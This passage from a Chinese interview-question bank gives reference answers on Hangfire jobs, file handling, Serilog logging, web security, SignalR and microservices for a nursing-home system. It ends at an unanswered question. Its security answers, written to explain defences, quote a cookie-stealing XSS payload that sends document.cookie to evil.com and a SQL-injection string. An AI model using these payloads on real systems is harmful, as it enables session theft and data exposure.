**参考答案**：CRON 表达式是一种用于定义定时任务执行时间的字符串格式，由5个字段组成：分钟、小时、日、月、星期。例如 `0 2 1 * *` 表示每月1号凌晨2点执行。在养老院系统中，月度账单生成任务应该在每月1号凌晨2点执行，因为此时系统负载最低，可以避免影响白天的正常使用。对应的 CRON 表达式为 `0 2 1 * *`。需要注意配置正确的时区，确保任务在中国标准时间的凌晨2点执行，而不是 UTC 时间。如果需要每天早上8点检查过期提醒，则使用 `0 8 * * *` 表达式。

### 第5题（中级 / 概念题）
**题目**：`AsyncPeriodicBackgroundWorkerBase` 与 Hangfire 的 `RecurringJob` 有什么区别？在养老院系统中如何选择？

**参考答案**：`AsyncPeriodicBackgroundWorkerBase` 是 ABP 框架提供的周期性 Worker 基类，通过 `AbpTimer` 控制执行间隔，以毫秒为单位设置周期。它运行在应用进程内部，依赖 ABP 的依赖注入容器，可以方便地注入各种服务。`RecurringJob` 是 Hangfire 提供的周期任务机制，使用 CRON 表达式定义执行计划，任务存储在数据库中，支持分布式执行和 Dashboard 监控。在养老院系统中，对于需要简单定时执行且不需要复杂管理的场景，可以使用 `AsyncPeriodicBackgroundWorkerBase`，如药品过期检查。对于需要持久化、分布式执行、可视化管理的关键任务，如月度账单生成和报表生成，建议使用 `RecurringJob`。

### 第6题（中级 / 概念题）
**题目**：为什么建议为 Hangfire 创建独立的数据库？

**参考答案**：建议为 Hangfire 创建独立的数据库主要有以下几个原因。首先，Hangfire 会在数据库中创建多个表来存储任务信息、执行历史、计数器等，这些表的数据量会随着任务执行不断增长，与业务数据混在一起会影响业务查询性能。其次，Hangfire 的数据生命周期与业务数据不同，任务执行历史可以定期清理，而业务数据需要长期保留，分开存储便于独立管理数据清理策略。在养老院系统中，每月生成账单会产生大量任务记录，如果与入住信息、账单数据共用数据库，可能会因为任务表的膨胀影响账单查询等核心业务的响应速度。独立数据库还可以独立进行备份、扩展和故障隔离。

### 第7题（高级 / 设计题）
**题目**：什么是幂等性？在养老院账单生成任务中如何保证幂等性？

**参考答案**：幂等性是指一个操作执行一次和执行多次的结果完全相同。在后台任务场景中，由于网络异常、服务重启等原因，Hangfire 可能会重复执行同一个任务，如果任务不具备幂等性，就可能产生重复数据。在养老院账单生成任务中，保证幂等性的方法包括：首先在生成账单前查询是否已存在相同老人、相同年月的账单，如果已存在则跳过生成。其次使用分布式锁防止并发重复执行，确保同一时间只有一个实例在生成某个老人的账单。还可以使用双重检查锁模式，在获取锁之后再次检查，防止在等待锁的过程中其他实例已完成生成。这些措施共同保证了即使任务被重复执行，也不会产生重复的账单记录。

### 第8题（高级 / 设计题）
**题目**：Hangfire 的自动重试机制是如何工作的？如何配置重试策略？

**参考答案**：Hangfire 的自动重试机制在任务执行失败后，会按照配置的策略自动重新执行任务。默认情况下，Hangfire 会重试10次，重试间隔采用指数退避算法，从1分钟开始逐渐增加。可以通过 `[AutomaticRetry]` 特性自定义重试行为：`Attempts` 属性设置最大重试次数，`DelaysInSeconds` 数组设置每次重试的间隔时间，设置 `Attempts = 0` 可以禁用自动重试。在养老院系统中，账单生成任务建议设置重试3次，间隔分别为1分钟、5分钟、15分钟，因为账单生成可能因为数据库连接问题暂时失败，适当重试可以提高成功率。对于发送通知等一次性任务，可以设置较少的重试次数或禁用重试，避免重复发送。

### 第9题（高级 / 设计题）
**题目**：在养老院系统中，如何设计一个可靠的任务调度架构？

**参考答案**：设计可靠的任务调度架构需要考虑以下几个方面。首先，使用 Hangfire 作为任务调度框架，将任务持久化到 MySQL 数据库中，确保应用重启后任务不丢失。其次，将 Hangfire 数据库与业务数据库分离，避免任务日志影响业务性能。第三，实现任务的幂等性设计，防止重复执行产生错误数据。第四，配置合理的自动重试策略，对不同类型的任务设置不同的重试次数和间隔。第五，使用 Hangfire Dashboard 配合权限控制，让管理员可以监控任务执行状态并手动触发任务。第六，对于关键任务实现分布式锁，防止在多实例部署时重复执行。第七，定期清理已完成的任务历史记录，防止数据库表过度膨胀。在养老院系统中，这样的架构能够确保每月账单生成、每日过期提醒等关键任务可靠执行。

### 第10题（高级 / 场景题）
**题目**：养老院系统部署了多个应用实例，如何确保周期任务只执行一次？

**参考答案**：在多实例部署环境下，Hangfire 通过分布式锁机制确保周期任务只执行一次。Hangfire 在执行任务时会从数据库中获取分布式锁，同一时刻只有一个实例能够获取到锁并执行任务，其他实例会等待或跳过。使用 MySQL 存储时，分布式锁通过数据库的行级锁实现。在养老院系统中，月度账单生成任务如果被多个实例同时执行，会导致重复账单，Hangfire 的分布式锁机制天然解决了这个问题。此外，还可以在业务代码中通过 `IDistributedLock` 接口实现更细粒度的并发控制，例如在生成单个老人的账单时获取独立的锁，允许不同老人的账单并行生成，提高整体执行效率。需要注意配置合理的锁超时时间，防止长时间持有锁导致其他实例无法执行。

### 第11题（高级 / 场景题）
**题目**：Hangfire 任务执行失败后如何排查问题？

**参考答案**：排查 Hangfire 任务执行失败可以从以下几个方面入手。首先，访问 Hangfire Dashboard 的"失败"页面，查看任务的异常信息和堆栈跟踪，这是最直接的排查方式。其次，查看应用日志，任务执行过程中的 `Logger.LogError` 输出会记录详细的错误信息。第三，检查任务方法的参数是否正确，序列化问题可能导致任务无法正确执行。第四，确认依赖注入的服务是否正确注册，Hangfire 在独立线程中执行任务，需要确保所有依赖的服务都在作用域中可用。在养老院系统中，账单生成任务失败可能是因为数据库连接超时、某个老人的数据不完整等原因，通过 Dashboard 可以快速定位失败的任务和具体原因，然后修复问题后手动重新触发任务执行。

### 第12题（高级 / 设计题）
**题目**：请为养老院系统设计一套完整的后台任务方案，涵盖账单、提醒、报表三大场景。

**参考答案**：养老院后台任务方案设计如下。技术选型方面，使用 Hangfire 作为任务调度框架，MySQL 作为持久化存储，与业务数据库分离部署。账单场景方面，每月1号凌晨2点通过 `RecurringJob` 触发月度账单生成任务，使用幂等性设计防止重复生成，支持管理员通过 Controller 手动触发补生成。提醒场景方面，使用 `AsyncPeriodicBackgroundWorkerBase` 每天早上8点检查药品过期和合同到期，发现即将过期的项目后发送通知给管理员和相关护理人员。报表场景方面，每月2号凌晨3点生成上月运营报表，包括入住统计、收入统计、服务满意度等数据，生成 PDF 后通知管理员下载。所有任务都配置合理的自动重试策略，关键任务使用分布式锁防止并发问题，通过 Dashboard 进行任务监控和管理，配合权限控制确保只有管理员可以访问。

---

## 第 15 章：文件管理与 Excel 导入导出

### 第1题（初级 / 概念题）
**题目**：文件上传时如何校验文件类型？

**参考答案**：读取文件头（magic number）判断真实类型。例如 PNG 前 8 字节是 `89 50 4E 47 0D 0A 1A 0A`，PDF 以 `%PDF` 开头。对内部系统，ContentType + 扩展名双重校验通常已够用。养老院场景：健康档案上传只允许 PDF/JPG/PNG，拒绝 .exe/.bat 等可执行文件。

---

### 第2题（初级 / 概念题）
**题目**：HSSFWorkbook 和 XSSFWorkbook 有什么区别？

**参考答案**：`HSSFWorkbook` 处理 `.xls`（97-2003），最大 65536 行；`XSSFWorkbook` 处理 `.xlsx`（2007+），无行数限制。养老院上报模板多为 `.xls`，用 `HSSFWorkbook`。两者 API 几乎一致，替换即可。注意：`SXSSFWorkbook` 是 `XSSFWorkbook` 的流式版本，适合大数据量导出。

---

### 第3题（中级 / 概念题）
**题目**：Excel 导入大量数据时如何优化性能？

**参考答案**：① UnitOfWork 在最后统一提交事务（避免每行一次事务）；② `AddRangeAsync` 批量插入（减少数据库交互次数）；③ 数据量极大时用 `SqlBulkCopy`（绕过 EF Core，直接批量写入）。养老院场景：批量导入 5000 条长者健康档案，用 `AddRangeAsync` 比逐条 `InsertAsync` 快 10 倍。

---

### 第4题（初级 / 概念题）
**题目**：为什么文件存储要用接口抽象（IFileStorageService）？

**参考答案**：依赖倒置原则（DIP）。上层代码依赖 `IFileStorageService` 接口，不关心本地存储还是 OSS。迁移到 OSS 时只需新增实现，业务代码零修改。养老院场景：初期用本地存储快速上线，后期迁移到阿里云 OSS，只需替换实现类。

---

### 第5题（中级 / 场景题）
**题目**：如何用 NPOI 基于模板导出 Excel？

**参考答案**：用 `HSSFWorkbook` 读取预定义的 `.xls` 模板文件（含表头、样式、公式），通过 `GetRow`/`GetCell` 定位单元格，`SetCellValue` 填入数据，`NpoiExcelExportHelper._.CreateStyle` 创建样式，最后 `Write` 保存到文件。养老院场景：月度费用报表模板已定义好表头和格式，代码只需填入长者姓名、费用金额、缴费状态等数据。

---

### 第6题（高级 / 场景题）
**题目**：文件上传接口如何防止恶意攻击？

**参考答案**：① ContentType 白名单（只允许 PDF/JPG/PNG）；② 文件大小限制（`MultipartBodyLengthLimit` 设为 10MB）；③ 文件头校验（magic number，防伪造扩展名）；④ 文件名用 GUID 重命名（防路径遍历攻击）；⑤ 存储目录不与 Web 根目录重叠（防直接 URL 访问）。养老院场景：家属上传长者身份证扫描件，必须严格校验。

---

### 第7题（初级 / 概念题）
**题目**：NpoiExcelExportHelper 的作用是什么？

**参考答案**：`NpoiExcelExportHelper` 是项目封装的 Excel 导出辅助类（单例模式），提供 `CreateStyle` 创建单元格样式、`SetCellValue` 设置单元格值等方法。它统一了导出逻辑，避免每个导出功能重复写 NPOI 样式代码。养老院系统中所有报表导出都通过这个 Helper 完成。

---

### 第8题（中级 / 概念题）
**题目**：文件下载 URL 怎么生成？

**参考答案**：通过 `ApplicationHelper.GetUrl(Options.FileRootUrl, "/" + filePath)` 拼接完整 URL。`YlsOptions.FileRootUrl` 在配置文件中定义（如 `https://files.nursinghome.com`），文件存储时只保存相对路径（如 `uploads/2026/07/elder-001.pdf`），下载时拼接完整 URL 返回给前端。这样换域名只需改配置。

---

### 第9题（高级 / 设计题）
**题目**：如何设计一个支持本地存储和 OSS 的文件服务？

**参考答案**：定义 `IFileStorageService` 接口（`UploadAsync`/`DownloadAsync`/`DeleteAsync`），分别实现 `LocalStorageService`（存本地磁盘）和 `OssStorageService`（调阿里云 OSS SDK）。通过 DI 注册具体实现，业务代码只依赖接口。养老院场景：开发环境用本地存储，生产环境用 OSS，通过配置切换实现类。

---

### 第10题（中级 / 场景题）
**题目**：Excel 导入时如何处理数据校验错误？

**参考答案**：逐行读取数据，校验每个字段（姓名非空、年龄范围、日期格式），将错误信息收集到列表中（包含行号+字段+错误原因）。全部读取完毕后，如果有错误则一次性返回所有错误信息，不插入任何数据；如果无错误则批量插入。养老院场景：导入长者信息时，第 3 行年龄为 -5、第 7 行姓名为空，应同时报告两个错误。

---


## 第 16 章：日志体系与异常处理

### 第1题（初级 / 概念题）
**题目**：Serilog 的六个日志级别分别是什么？各用于什么场景？

**参考答案**：Verbose（最详细，开发调试用）、Debug（调试信息，开发环境用）、Information（常规业务流程记录，生产环境默认级别）、Warning（异常但不影响业务，如配置缺失但有默认值）、Error（异常导致操作失败，需要关注）、Fatal（致命错误，系统可能无法继续运行）。养老院场景：长者入住成功用 Information，入住人数超限用 Warning，账单生成失败用 Error。

---

### 第2题（中级 / 概念题）
**题目**：UserFriendlyException 和 BusinessException 有什么区别？

**参考答案**：`UserFriendlyException` 的消息会直接显示给前端用户（如"该长者已入住，不能重复入住"），通常不写入 Error 级别系统日志；但操作仍可能出现在审计日志（AuditLog）中。`BusinessException` 是业务异常，支持多语言（通过错误码查找本地化消息），ABP 会记录审计日志。普通 `Exception` 是系统异常，ABP 全局过滤器捕获后返回 500，不暴露内部细节。养老院场景：业务校验用 `UserFriendlyException`，需要多语言的用 `BusinessException`。

---

### 第3题（初级 / 概念题）
**题目**：什么是结构化日志？和传统字符串日志有什么区别？

**参考答案**：传统日志 `Log($"用户{id}在{time}入住")` 输出纯字符串，无法按字段搜索。结构化日志 `Log.Information("用户{UserId}在{Time}入住", id, time)` 输出结构化数据，ES 可以按 `UserId`、`Time` 字段索引和搜索。养老院场景：需要查"某个护工今天操作了哪些长者"，结构化日志可以按 `UserId` 字段精确搜索，字符串日志只能全文模糊匹配。

---

### 第4题（中级 / 概念题）
**题目**：Serilog 的 File Sink 如何配置按日期滚动？

**参考答案**：配置 `rollingInterval: RollingInterval.Day` 按天滚动，`retainedFileCountLimit: 30` 保留最近 30 天日志。文件名自动附加日期（如 `log-20260710.txt`）。还可以配置 `fileSizeLimitBytes` 限制单文件大小。养老院场景：生产环境每天生成一个日志文件，保留 30 天，超大日志自动分割。

---

### 第5题（高级 / 场景题）
**题目**：如何配置生产环境的异常邮件通知？

**参考答案**：在 Serilog 的 `LoggerFilter` 或自定义中间件中，当日志级别 ≥ Error 时触发邮件发送。注入 `IEmailSender`（ABP 内置），将异常信息（时间、请求路径、用户、堆栈）格式化为邮件正文，发送给开发团队。注意：① 只发 Error/Fatal，不发 Warning；② 加频率限制（如同一异常 5 分钟内只发一次），避免邮件轰炸。养老院场景：账单生成接口报错，5 分钟内收到一封邮件。

---

### 第6题（中级 / 概念题）
**题目**：ABP 的 AbpExceptionFilter 工作流程是什么？

**参考答案**：当 Controller 方法抛出未处理异常时：① 判断异常类型——`UserFriendlyException` 返回 403 + 消息体；`EntityNotFoundException` 返回 404；`AbpAuthorizationException` 返回 401/403；其他 `Exception` 返回 500 + 通用错误消息（不暴露细节）。② 所有异常都记录审计日志。③ 开发环境可配置显示详细异常信息。养老院场景：护工调用未授权接口返回 403，系统 bug 返回 500。

---

### 第7题（初级 / 概念题）
**题目**：为什么生产环境不应该用 Debug 级别日志？

**参考答案**：Debug 日志包含大量内部调试信息（SQL 语句、变量值、方法调用链），日志量是 Information 的 10-100 倍。会导致：① 磁盘快速写满；② ES 索引压力大；③ 真正的错误信息被淹没在海量调试日志中。养老院场景：生产环境用 Information 级别，只记录业务流程（入住、缴费、护理）；开发环境用 Debug 级别，方便调试。

---

### 第8题（高级 / 场景题）
**题目**：如何在日志中追踪一个请求的完整链路？

**参考答案**：使用 `CorrelationId`（关联 ID）。每个请求生成唯一 ID（如 GUID），通过中间件注入到 `HttpContext.Items`，日志中所有输出都包含这个 ID。跨服务调用时通过 Header 传递。养老院场景：长者入住请求涉及多个服务（长者服务→财务服务→通知服务），通过 CorrelationId 可以串联所有日志，快速定位是哪个环节出错。

---

### 第9题（中级 / 概念题）
**题目**：ABP 审计日志默认记录哪些信息？

**参考答案**：操作人（UserId/UserName/TenantId）、操作时间、执行耗时、服务名、方法名、HTTP 方法和路径、请求参数、返回值、客户端 IP、浏览器信息、异常信息。启用实体变更追踪后还记录字段级变更（属性名、旧值、新值）。养老院场景：修改长者护理等级时，审计日志记录"张三于 2026-07-10 将护理等级从自理改为半护理"。

---

### 第10题（高级 / 设计题）
**题目**：如何设计一个生产环境的完整日志方案？

**参考答案**：三层架构：① Serilog File Sink——本地日志文件，按天滚动，保留 30 天，作为最后保底；② Serilog Elasticsearch Sink——实时写入 ES，配合 Kibana 做可视化搜索和告警；③ 异常邮件通知——Error 级别触发邮件。配置 `Serilog.Sinks.Async` 异步写入，避免日志 IO 阻塞业务线程。养老院系统：日常排查用 Kibana 搜索，紧急问题靠邮件通知，磁盘日志作为兜底。

---


## 第 17 章：网络协议与安全防护

### 第1题（初级 / 概念题）
**题目**：请描述 HTTP 请求和响应的完整结构。

**参考答案**：HTTP 请求由请求行（方法、URL、协议版本）、请求头（Content-Type、Authorization 等元数据）、请求体（POST 数据）三部分组成。响应由状态行（状态码和原因短语）、响应头（Content-Type 等）、响应体（返回数据）三部分组成。在养老院系统中，前端查询老人信息时，Authorization 头携带 JWT Token，GET 请求无请求体，响应体返回 JSON 数据，状态码为 200。

### 第2题（初级 / 概念题）
**题目**：GET 和 POST 请求有什么区别？

**参考答案**：GET 参数在 URL 查询字符串中，可被缓存，有长度限制，幂等，用于查询。POST 参数在请求体中，不缓存，无长度限制，非幂等，用于创建/修改。养老院系统中查询老人列表用 GET（`/api/elderly?page=1`），新增入住用 POST。GET 参数暴露在 URL 中，不适合传递敏感信息。

### 第3题（中级 / 概念题）
**题目**：HTTPS 的工作原理是什么？SSL/TLS 握手过程是怎样的？

**参考答案**：HTTPS = HTTP + SSL/TLS。握手四步：①客户端发 ClientHello 告知加密算法和 TLS 版本；②服务器返回 ServerHello 和数字证书（含公钥）；③客户端验证证书后生成随机对称密钥，用服务器公钥加密发送；④双方用对称密钥加密后续通信。握手用非对称加密交换密钥，之后用对称加密高效传输。养老院系统涉及健康信息等敏感数据，必须用 HTTPS。

### 第4题（中级 / 概念题）
**题目**：请描述 TCP 三次握手和四次挥手。为什么不能两次握手？

**参考答案**：三次握手：①客户端 SYN；②服务器 SYN+ACK；③客户端 ACK。四次挥手：①客户端 FIN；②服务器 ACK；③服务器 FIN；④客户端 ACK 并 TIME_WAIT。不能两次握手因为无法确认客户端接收能力，可能导致无效连接和资源浪费。养老院系统高并发场景下，理解 TCP 对排查连接超时和 TIME_WAIT 堆积至关重要。

### 第5题（中级 / 概念题）
**题目**：什么是 SQL 注入？如何防御？

**参考答案**：SQL 注入是在输入中拼接恶意 SQL 改变查询逻辑。养老院系统搜索框输入 `' OR '1'='1` 会返回所有老人信息。防御：使用 EF Core LINQ 查询（自动参数化）；原生 SQL 用参数化查询；输入验证和长度限制；数据库账号最小权限。最根本的是永远不要拼接用户输入到 SQL。

### 第6题（中级 / 概念题）
**题目**：什么是 XSS 攻击？如何防御？

**参考答案**：XSS 是在页面注入恶意 JS，在其他用户浏览器中执行，可能窃取 Cookie。养老院备注字段注入 `<script>fetch('https://evil.com?c='+document.cookie)</script>` 会窃取会话。防御：输出编码用 `HtmlEncoder.Default.Encode()`；输入验证；Content-Security-Policy 头；Cookie 设 HttpOnly 属性。

### 第7题（中级 / 概念题）
**题目**：什么是 CSRF 攻击？AntiForgeryToken 原理是什么？

**参考答案**：CSRF 是诱导已登录用户发起伪造请求，浏览器自动携带 Cookie。护理人员访问恶意网站后，浏览器可能向养老院系统发起删除操作。AntiForgeryToken 原理：服务器生成随机 Token 分别放入 Cookie 和表单，提交时比对一致性。攻击者无法获取 Token（同源策略保护），请求被拒绝。

### 第8题（中级 / 概念题）
**题目**：对称加密和非对称加密有什么区别？各适用什么场景？

**参考答案**：对称加密同一把密钥（AES），快但密钥分发难。非对称加密公钥加密私钥解密（RSA），安全但慢。养老院系统中 AES 加密健康档案存储，RSA 用于密钥交换和签名。HTTPS 握手用 RSA 交换密钥，之后用 AES 加密通信。密码存储用 BCrypt 哈希（不可逆），不是加密（可逆）。

### 第9题（高级 / 设计题）
**题目**：接口签名验证如何实现防篡改和防重放？

**参考答案**：防篡改：参数排序拼接加密钥后 SHA256 哈希生成 sign，服务端重算比对，篡改则签名不匹配。防重放：timestamp 限制 5 分钟有效期，nonce 唯一性检查（已用 nonce 记录在缓存）。养老院对接第三方医保系统时，此方案防止请求被拦截、篡改或重放。

### 第10题（初级 / 概念题）
**题目**：HTTP 状态码 401 和 403 有什么区别？

**参考答案**：401 未认证（未登录），403 已认证但权限不足。养老院系统中未登录访问管理页返回 401，普通护工访问院长专属财务报表返回 403。核心区别：401 是"你是谁？"，403 是"我知道你是谁，但你没权限"。ABP 中未认证自动 401，`[Authorize(Roles="Admin")]` 失败返回 403。

### 第11题（高级 / 场景题）
**题目**：为什么密码用 BCrypt 而不是 MD5 或 AES？

**参考答案**：MD5 没有内置 Salt，相同密码相同哈希值，可用彩虹表反查，且计算快暴力破解成本低。AES 可逆，密钥泄露所有密码还原。BCrypt 内置 Salt，慢哈希算法，workFactor 可调。养老院系统密码用 BCrypt，即使数据库泄露也难批量还原。

### 第12题（中级 / 概念题）
**题目**：什么是点击劫持？如何防御？

**参考答案**：点击劫持用透明 iframe 嵌入目标网站，诱导用户点击隐藏按钮。攻击者创建"领取养老补贴"页面，透明嵌入"确认删除"按钮。防御：`X-Frame-Options` 响应头设为 `SAMEORIGIN` 或 `DENY`。ASP.NET Core 中间件统一设置即可。

### 第13题（高级 / 场景题）
**题目**：养老院系统对接第三方医保系统，如何设计 API 安全方案？

**参考答案**：四层方案：①全 HTTPS 加密传输；②接口签名验证（timestamp 5 分钟过期防重放，nonce 唯一性防重放，sign 签名防篡改）；③敏感数据 AES 加密存储，展示时脱敏；④IP 白名单限制。同时记录所有签名参数和验证结果便于审计。

---

## 第 18 章：SignalR 实时通信与消息推送

### 第1题（初级 / 概念题）
**题目**：HTTP 和 WebSocket 有什么区别？

**参考答案**：HTTP 是单向请求-响应模式，客户端发请求、服务端返回响应，服务端不能主动推送。WebSocket 是双向通信，建立连接后双方可以随时互发消息。养老院场景：HTTP 适合查询长者信息（请求→响应），WebSocket 适合体征告警推送（服务端主动推送到护士大屏）。HTTP 轮询每 5 秒查一次浪费资源，WebSocket 秒级推送零延迟。

---

### 第2题（初级 / 概念题）
**题目**：SignalR 的 Hub 是什么？生命周期方法有哪些？

**参考答案**：Hub 是 SignalR 的服务端核心类，客户端通过 WebSocket 连接到 Hub，调用 Hub 方法或接收推送。`OnConnectedAsync` 在客户端连接时触发（可记录在线用户），`OnDisconnectedAsync` 在断开时触发（可清理资源）。养老院场景：护士打开大屏时触发 `OnConnectedAsync`，将其加入"护士"分组；关闭页面时触发 `OnDisconnectedAsync`，移出分组。

---

### 第3题（中级 / 概念题）
**题目**：SignalR 如何实现分组推送？

**参考答案**：通过 `Groups.AddToGroupAsync(connectionId, groupName)` 将连接加入分组，推送时用 `Clients.Group("groupName").SendAsync(...)` 只发给组内成员。养老院场景：按养老院分组（`Tenant_阳光院`），按角色分组（`Tenant_阳光院_Role_Nurse`），按楼层分组（`Floor_3`）。长者体征异常时只推送到对应楼层的护士组。

---

### 第4题（中级 / 场景题）
**题目**：多租户场景下 SignalR 如何保证消息隔离？

**参考答案**：连接时根据 JWT Token 中的 TenantId 自动加入对应租户分组（如 `Tenant_{tenantId}`）。推送时只发到对应租户的分组。管理员可加入 `Host` 分组接收所有租户的消息。养老院场景：阳光养老院的告警只推给阳光院的护士，幸福养老院的护士收不到。ABP 的 `INotificationPublisher` 会自动根据当前租户分发。

---

### 第5题（初级 / 概念题）
**题目**：JWT Token 如何在 WebSocket 连接中传递？

**参考答案**：WebSocket 握手阶段无法自定义 Header，所以 Token 通过 QueryString 传递：`/hubs/notification?access_token=xxx`。服务端在 `OnMessageReceived` 回调中从查询参数读取 Token 并验证。养老院场景：护士打开大屏页面时，前端 JS 连接 `/hubs/vital-sign?access_token=xxx`，服务端验证 Token 后允许连接。

---

### 第6题（高级 / 场景题）
**题目**：如何防止 SignalR 推送风暴（同一告警反复推送）？

**参考答案**：① 频率限制：同一体征指标在 5 分钟内只推一次（用 ConcurrentDictionary 记录上次推送时间）；② 告警升级：第一次推送"警告"，持续未处理升级为"紧急"；③ 合并推送：多个体征异常合并为一条消息。养老院场景：长者心率持续偏高，5 分钟内只推一次"心率警告"，10 分钟未处理升级为"紧急告警"。

---

### 第7题（中级 / 概念题）
**题目**：ABP 的通知系统如何与 SignalR 集成？

**参考答案**：ABP 提供 `INotificationPublisher` 发布通知，内部通过 `RealTimeNotifier` 调用 SignalR 的 `IHubContext` 推送到客户端。开发者只需定义通知类型（继承 `NotificationData`）、发布通知（`_notificationPublisher.PublishAsync`），ABP 自动处理 SignalR 推送。养老院场景：体征异常时发布 `VitalSignAlertNotification`，ABP 自动推送到护士大屏。

---

### 第8题（初级 / 概念题）
**题目**：SignalR 断线重连怎么处理？

**参考答案**：前端配置 `withAutomaticReconnect()` 自动重连（默认间隔 0/2/10/30 秒）。重连后需要重新加入分组（因为新连接的 connectionId 不同）。服务端在 `OnReconnected` 中处理。养老院场景：护士大屏网络抖动断开后自动重连，前端在 `onreconnected` 回调中重新订阅楼层分组，确保告警不丢失。

---

### 第9题（高级 / 设计题）
**题目**：如何设计养老院系统的实时告警推送架构？

**参考答案**：三层架构：① 体征监测服务（后台 Worker）定期检查传感器数据，超过阈值时调用 `INotificationPublisher` 发布告警；② ABP 通知系统根据当前租户和角色确定推送目标；③ SignalR Hub 按分组推送到护士大屏、手机 App。告警分级：黄色（Warning）= 需关注，红色（Emergency）= 立即处理。推送记录写入数据库，支持事后追溯。

---

### 第10题（中级 / 概念题）
**题目**：SignalR 的传输方式有哪些？

**参考答案**：三种传输方式按优先级自动降级：① WebSocket（全双工，最优）；② Server-Sent Events（服务端单向推送，次选）；③ Long Polling（长轮询，兜底）。SignalR 自动协商：先尝试 WebSocket，不支持则降级。现代浏览器都支持 WebSocket，通常不会降级。养老院系统的护士大屏用现代浏览器，始终走 WebSocket。

---

### 第11题（高级 / 场景题）
**题目**：如何在 SignalR 中实现按楼层推送？

**参考答案**：护士登录后，前端调用 Hub 方法 `JoinFloorGroup(floorId)`，服务端将其连接加入对应楼层分组。体征异常时根据长者所在楼层推送到对应分组。护士换楼层时调用 `LeaveFloorGroup(oldFloorId)` + `JoinFloorGroup(newFloorId)`。养老院场景：3 楼长者心率异常，只推送到 3 楼护士站大屏。

---

### 第12题（高级 / 设计题）
**题目**：如何保证 SignalR 推送消息的可靠性（不丢失）？

**参考答案**：① 客户端 ACK 确认：推送后等待客户端回复确认，未确认则重发；② 消息持久化：推送记录写入数据库，客户端重连后拉取未读消息；③ 断线重连 + 状态同步：重连后客户端调用 Hub 方法获取最新状态。养老院场景：护士大屏断线 1 分钟后重连，自动拉取这 1 分钟内的未读告警，确保告警不丢失。

---


## 第 19 章：微服务架构与 API 网关

### 第1题（中级 / 概念题）
**题目**：什么是微服务？单体架构和微服务架构有什么区别？

**参考答案**：微服务是一种架构风格，将应用程序拆分为一组小型、独立部署的服务。以养老院为例，单体架构就像一栋综合楼管理所有业务（接待、财务、护理），微服务则拆分为多栋独立小楼各管各的。单体架构部署简单但耦合度高，修改财务模块需要重新部署整个系统；微服务各服务独立部署，但引入了网络通信、分布式事务等复杂性。选择时需要根据团队规模、业务复杂度和部署频率来决定。

### 第2题（高级 / 概念题）
**题目**：请比较令牌桶和漏桶算法的区别，各自适用于什么场景？

**参考答案**：漏桶算法以恒定速率处理请求，就像养老院前台以固定速度接待访客，超出桶容量的请求直接丢弃，适合需要严格控速的场景。令牌桶算法以恒定速率生成令牌，允许桶中积累令牌从而应对突发流量，就像前台每天准备一定数量的访客牌，积攒的访客牌可以在高峰期一次性使用。令牌桶更适合生产环境，因为大多数业务场景需要允许一定的突发流量。养老院系统在月底集中缴费时会产生突发请求，使用令牌桶可以平滑处理这种场景。

### 第3题（高级 / 概念题）
**题目**：请解释熔断器的三种状态及其转换条件。

**参考答案**：熔断器有三种状态：Closed（关闭/正常）、Open（打开/熔断）、HalfOpen（半开/试探）。正常情况下处于 Closed 状态，所有请求正常通过但记录失败次数；当失败次数达到阈值（如连续 5 次），熔断器切换到 Open 状态，此时所有请求直接返回失败（快速失败），不再调用下游服务；经过一段超时时间后，熔断器进入 HalfOpen 状态，允许少量请求通过以试探下游服务是否恢复，如果试探成功则回到 Closed 状态，失败则回到 Open 状态。在养老院系统中，当财务服务连续 5 次超时后，网关会自动熔断，避免请求堆积压垮财务服务。

### 第4题（中级 / 场景题）
**题目**：Polly 的重试策略有哪些参数可以配置？指数退避是什么意思？

**参考答案**：Polly 重试策略主要配置三个参数：重试次数、退避间隔和重试回调。指数退避是指每次重试的等待时间按 2 的幂次递增，如第 1 次等 2 秒，第 2 次等 4 秒，第 3 次等 8 秒。这种策略的好处是给下游服务更多恢复时间，避免密集重试导致雪崩。在养老院系统中，如果财务服务暂时过载，指数退避可以减轻其压力，而不是立即重试加重负担。

### 第5题（中级 / 概念题）
**题目**：什么是 API 网关？Ocelot 网关的主要功能有哪些？

**参考答案**：API 网关是微服务架构的统一入口，负责路由转发、负载均衡、认证授权、限流等功能。Ocelot 是 .NET 生态中的 API 网关库，主要功能包括：路由转发（将外部请求映射到对应的内部服务）、负载均衡（支持轮询和最少连接策略）、限流（限制客户端请求速率）、请求聚合（合并多个下游服务的响应）。在养老院系统中，网关接收所有外部请求，根据 URL 路径将长者相关请求转发到长者服务，财务相关请求转发到财务服务。

### 第6题（中级 / 场景题）
**题目**：什么是 CorrelationId？在微服务架构中有什么作用？

**参考答案**：CorrelationId（关联 ID）是一个唯一标识符，用于串联一次请求在多个微服务中的完整调用链。当养老院系统的前端发起一个查询请求，经过网关到达长者服务，长者服务再调用财务服务，每个环节的日志都会记录同一个 CorrelationId。排查问题时只需搜索这个 ID，就能看到从网关到各服务的完整日志链路，快速定位问题所在。通常通过 HTTP Header（X-Correlation-Id）在服务间传递。

### 第7题（初级 / 概念题）
**题目**：服务注册与发现的流程是什么？Consul 和 Nacos 有什么区别？

**参考答案**：服务注册与发现的流程是：服务启动时向注册中心注册自己的地址和端口，定期发送心跳证明自己还活着（健康检查），客户端从注册中心查询目标服务的可用实例列表。Consul 是 HashiCorp 开源的，主要提供服务发现和健康检查；Nacos 是阿里巴巴开源的，额外提供配置中心功能，支持动态配置更新。在养老院系统中，长者服务启动时向注册中心注册，财务服务需要调用时从注册中心获取长者服务的地址。

### 第8题（高级 / 设计题）
**题目**：如何设计一个令牌桶限流器？请描述核心数据结构和算法。

**参考答案**：令牌桶限流器需要三个核心参数：桶容量（最大令牌数）、补充速率（每秒生成的令牌数）、当前令牌数。核心算法是：每次请求到来时，先根据上次补充时间和当前时间的差值计算应补充的令牌数（不能超过桶容量），然后检查当前令牌数是否大于 0，是则消耗一个令牌放行请求，否则拒绝。需要注意线程安全，使用锁或原子操作。在养老院系统中，如果设定桶容量为 50、补充速率为每秒 10 个令牌，那么可以应对最多 50 个并发请求的突发，之后以每秒 10 个的速率平稳处理。

### 第9题（中级 / 场景题）
**题目**：Ocelot 的负载均衡策略有哪些？LeastConnection 和 RoundRobin 有什么区别？

